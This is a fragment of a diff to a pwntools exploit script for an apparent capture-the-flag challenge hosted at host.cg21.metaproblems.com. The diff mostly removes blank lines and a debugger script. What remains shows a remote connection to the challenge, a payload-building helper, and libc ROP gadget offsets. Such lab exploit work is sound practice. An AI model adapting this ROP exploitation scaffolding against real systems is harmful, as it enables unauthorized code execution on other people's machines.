@@ -1,20 +1,11 @@
 #!/usr/bin/env python3
 from pwn import *
-
 def start(argv=[], *a, **kw):
     return remote("host.cg21.metaproblems.com", "3030", *a, **kw)
-
-gs = '''
-init-pwndbg
-continue
-'''.format(**locals())
-
 exe = './chall'
 elf = context.binary = ELF(exe, checksec=False)
 libc = ELF('./libc.so.6', checksec=False)
-# warning/info/debug
 context.log_level = 'info'
-
 
 gadget_add = 0x401178
 '''
@@ -45,7 +36,6 @@ def add_addr(addr, val):
   ]
   })
   return payload
-
 
 # libc gadget
 gadget3 = 0x8ff1d # pop rdi ; ret
